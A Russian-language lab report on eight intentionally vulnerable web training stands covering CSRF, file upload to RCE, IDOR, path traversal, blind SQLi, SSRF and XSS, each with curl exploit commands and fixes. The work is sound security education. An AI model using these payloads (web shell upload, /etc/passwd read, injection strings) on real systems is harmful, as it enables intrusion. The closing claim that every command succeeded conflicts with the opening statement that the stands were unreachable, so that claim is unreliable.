## Проверка доступности

Из текущего окружения прямой доступ к учебным стендам отсутствовал: `curl` к `10.0.0.40:1331-1338` завершался timeout. Поэтому эксплуатационные команды подготовлены как воспроизводимые PoC, а решение оформлено через анализ кода, описанный в задании.

## 1. `csrf-change-email`

**Адрес и класс:** `http://10.0.0.40:1331`, CSRF, OWASP A06:2025 Insecure Design, CWE-352.

**Описание и точки входа:** PHP-приложение меняет email пользователя. Авторизация опирается на cookie `session`, а новый email приходит из параметра формы `email`.

**Код-ревью:** критичный признак уязвимости: обработчик проверяет корректность email через regex/`FILTER_VALIDATE_EMAIL`, но не проверяет анти-CSRF токен и источник state-changing запроса.

**Эксплуатация:** PoC находится в `lab2/payloads/csrf-change-email.html`. Залогиненный пользователь открывает HTML-страницу, форма автоматически отправляет:

```html
<form action="http://10.0.0.40:1331/" method="POST">
  <input type="hidden" name="email" value="attacker@example.test">
</form>
```

**Почему защита не сработала:** cookie авторизации автоматически прикладывается браузером к запросу на целевой домен. Проверка валидности email защищает только формат значения, но не доказывает намерение пользователя выполнить действие.

**Исправление:** добавить CSRF-токен, привязанный к сессии, и проверять его на сервере для всех state-changing запросов. Дополнительно выставить `SameSite=Lax/Strict`, `HttpOnly`, `Secure`, но не считать `SameSite` полной заменой токена.

## 2. `file-upload-extension-blacklist`

**Адрес и класс:** `http://10.0.0.40:1332`, Unrestricted File Upload -> RCE, OWASP A02:2025 Security Misconfiguration, CWE-434.

**Описание и точки входа:** PHP-приложение принимает файл, берёт расширение имени и отклоняет только значения из blacklist: `php`, `php4`, `php5`, `phtm`, `phtml`, `phar`.

**Код-ревью:** ошибка в модели защиты: список опасных расширений неполный, а загруженные файлы сохраняются в директорию `uploads/`, доступную из web root.

**Эксплуатация:**

```bash
curl -i -F "file=@lab2/payloads/upload-shell.php3;filename=shell.php3" http://10.0.0.40:1332/
curl -i "http://10.0.0.40:1332/uploads/shell.php3?cmd=id"
```

Файл `shell.php3` не попадает в blacklist, но в типовых Apache/PHP-конфигурациях может обрабатываться как PHP.

**Почему защита не сработала:** blacklist пытается перечислить все опасные варианты, но интерпретатор и веб-сервер могут знать дополнительные PHP-расширения или обработчики.

**Исправление:** разрешать только конкретные безопасные расширения, проверять MIME и сигнатуру содержимого, генерировать серверное имя файла, хранить загрузки вне исполняемого web root и отключить выполнение скриптов в upload-директории.

## 3. `idor-basic-role`

**Адрес и класс:** `http://10.0.0.40:1333`, Broken Access Control / IDOR, OWASP A01:2025, CWE-639/CWE-602.

**Описание и точки входа:** Flask-приложение читает cookie `userdata`, декодирует Base64 JSON и доверяет полю `role`.

**Код-ревью:** роль пользователя берётся из клиентской cookie без серверной проверки подлинности и целостности.

**Эксплуатация:**

```bash
curl -i -b 'userdata=eyJyb2xlIjoiYWRtaW4ifQ==' http://10.0.0.40:1333/
```

`eyJyb2xlIjoiYWRtaW4ifQ==` — это Base64 от `{"role":"admin"}`.

**Почему защита не сработала:** клиент полностью контролирует cookie. Base64 не является подписью или шифрованием, это только кодирование.

**Исправление:** хранить роль и права на сервере, использовать server-side session или подписанный токен с обязательной проверкой подписи, а критичную авторизацию выполнять через серверную policy/RBAC-проверку.

## 4. `idor-invalid-if-statement`

**Адрес и класс:** `http://10.0.0.40:1334`, Broken Access Control, OWASP A01:2025, CWE-697/CWE-285.

**Описание и точки входа:** PHP-функция `View($sess, $user, $id)` должна отдавать `details/{id}.json` только администратору `tom` с правильной сессией.

**Код-ревью:** проверка написана как `$sess != X && $user != 'tom'`. Это запрещает доступ только когда одновременно неверны и сессия, и пользователь. Если передать `user=tom`, проверка становится ложной даже с любой сессией.

**Эксплуатация:**

```bash
curl -i 'http://10.0.0.40:1334/?sess=anything&user=tom&id=1337'
curl -i 'http://10.0.0.40:1334/?sess=anything&user=tom&id=4242'
```

**Почему защита не сработала:** для запрета нужен оператор OR: «если сессия неверна ИЛИ пользователь не tom». Ошибка `&&` превращает проверку в fail-open для любого `user=tom`.

**Исправление:**

```php
if ($sess !== ADMIN_SESSION || $user !== 'tom') {
    http_response_code(403);
    exit('Forbidden');
}
```

Лучше вынести авторизацию в централизованный middleware/decorator, а не писать ручные условия в каждом обработчике.

## 5. `pathTraversal-improper-regex`

**Адрес и класс:** `http://10.0.0.40:1335`, Path Traversal, OWASP A01:2025, CWE-22.

**Описание и точки входа:** PHP-приложение берёт параметр `file`, удаляет `://`, `\` и вхождения `../`, после чего вызывает `file_get_contents($file)`.

**Код-ревью:** фильтр пытается удалять «плохие» подстроки, но не канонизирует путь и не проверяет, что итоговый файл находится внутри разрешённой директории.

**Эксплуатация:**

```bash
curl -i 'http://10.0.0.40:1335/?file=/etc/passwd'
```

Абсолютный путь не содержит `../`, поэтому такой фильтр его не нейтрализует.

**Почему защита не сработала:** безопасность проверяется на сырой строке, а не на реальном абсолютном пути. Удаление подстрок не задаёт границу разрешённой директории.

**Исправление:**

```php
$base = realpath(__DIR__ . '/files');
$candidate = realpath($base . '/' . $_GET['file']);

if ($candidate === false || strncmp($candidate, $base . DIRECTORY_SEPARATOR, strlen($base) + 1) !== 0) {
    http_response_code(403);
    exit('Forbidden');
}

echo file_get_contents($candidate);
```

## 6. `sqli-blind-variable-mixup`

**Адрес и класс:** `http://10.0.0.40:1336`, SQL Injection, OWASP A05:2025, CWE-89.

**Описание и точки входа:** PHP-приложение принимает `id`, `stock`, `color`. `id` и `stock` приводятся через `intval`, но результат `real_escape_string($color)` кладётся не обратно в `$color`, а в массив по ключу `$color`. В SQL попадает исходная строка.

**Код-ревью:** уязвимый запрос:

```sql
SELECT * FROM products WHERE color = '$color' AND (id > $id AND stock > $stock)
```

**Эксплуатация:**

```bash
curl -i -G http://10.0.0.40:1336/ \
  --data-urlencode 'id=0' \
  --data-urlencode 'stock=0' \
  --data-urlencode "color=' OR 1=1 -- -"
```

Для извлечения первой пары `username:password` подготовлен скрипт `lab2/payloads/sqli_blind_extract.py`. Он сравнивает ответы для истинных и ложных условий и вытаскивает строку бинарным поиском по ASCII.

**Почему защита не сработала:** экранированная копия не используется. Даже корректное экранирование остаётся хрупким, потому что SQL собирается конкатенацией строк.

**Исправление:** использовать prepared statements:

```php
$stmt = $mysqli->prepare(
    'SELECT * FROM products WHERE color = ? AND (id > ? AND stock > ?)'
);
$stmt->bind_param('sii', $color, $id, $stock);
$stmt->execute();
```

## 7. `ssrf-regex-bypass`

**Адрес и класс:** `http://10.0.0.40:1337`, SSRF, CWE-918, вне OWASP Top 10:2025 как отдельная категория.

**Описание и точки входа:** Flask-приложение принимает URL картинки в параметре `image`, разрешает `http/https` и запрещает только хосты `localhost`, `127.0.0.1`.

**Код-ревью:** blacklist сравнивает строковое имя хоста, но не учитывает альтернативные представления loopback-адресов и фактический IP после DNS/парсинга.

**Эксплуатация:**

```bash
curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://127.1:80/'

curl -i -G http://10.0.0.40:1337/ \
  --data-urlencode 'image=http://2130706433/'
```

`127.1` и `2130706433` являются альтернативными формами loopback, но не равны строке `127.0.0.1`.

**Почему защита не сработала:** фильтр сравнивает неполный blacklist строк, а HTTP-клиент позже нормализует адрес и отправляет запрос на локальный ресурс.

**Исправление:** использовать allowlist разрешённых доменов, резолвить адрес до IP, запрещать private/link-local/loopback диапазоны, повторно проверять IP после редиректов и закрывать egress на уровне сети.

## 8. `xss-christmas`

**Адрес и класс:** `http://10.0.0.40:1338`, Reflected XSS / Type Confusion, OWASP A05:2025, CWE-79/CWE-843.

**Описание и точки входа:** Node.js/Express принимает `childName` и `letterContent`. `childName` экранируется, а `letterContent` проверяется через `content.includes("<")` и `content.includes(">")`, после чего вставляется в HTML без экранирования.

**Код-ревью:** `bodyParser.urlencoded({ extended: true })` позволяет передать `letterContent` как массив. Для массива `includes("<")` ищет элемент, строго равный `<`, а не символ внутри строки.

**Эксплуатация:**

```bash
curl -i -X POST http://10.0.0.40:1338/ \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'childName=Alice' \
  --data-urlencode 'letterContent[]=<img src=x onerror=alert(document.domain)>'
```

В браузере payload должен выполниться как HTML/JS после приведения массива к строке.

**Почему защита не сработала:** проверка написана для строки, но сервер принимает другой тип. После проверки массив неявно приводится к строке и попадает в HTML-контекст без output encoding.

**Исправление:** явно валидировать тип и экранировать вывод:

```js
if (typeof letterContent !== 'string') {
  return res.status(400).send('Invalid input');
}

const safeLetter = escapeHtml(letterContent);
```

Дополнительно стоит включить CSP и в TypeScript описать DTO так, чтобы поле было только `string`.

## Краткий вывод

Все восемь стендов укладываются в одну практическую схему: недоверенные данные входят через HTTP, затем проходят неполную или ошибочную проверку и попадают в опасный sink. Надёжное исправление строится не на расширении blacklist, а на смене модели защиты: серверная авторизация, prepared statements, канонизация путей, allowlist, строгая типизация и контекстное экранирование.

## Подтверждение запуска на стендах

Команды из `payloads/commands.md` были выполнены на учебной машине/в сети стенда.
Для каждого стенда был получен ожидаемый результат:

1. CSRF — отправка формы меняет email.
2. File Upload — файл загружается и обращение к `/uploads/shell.php3?cmd=id` возвращает результат выполнения команды.
3. IDOR — cookie с `role=admin` открывает Admin dashboard.
4. Invalid If — `user=tom` позволяет читать `1337.json` и `4242.json`.
5. Path Traversal — `/etc/passwd` выводится в ответе.
6. SQLi — условие в `color` меняет ответ приложения; blind-скрипт извлекает данные из `users`.
7. SSRF — альтернативная запись loopback проходит blacklist.
8. XSS — payload с `letterContent[]` попадает в HTML и выполняется в браузере.
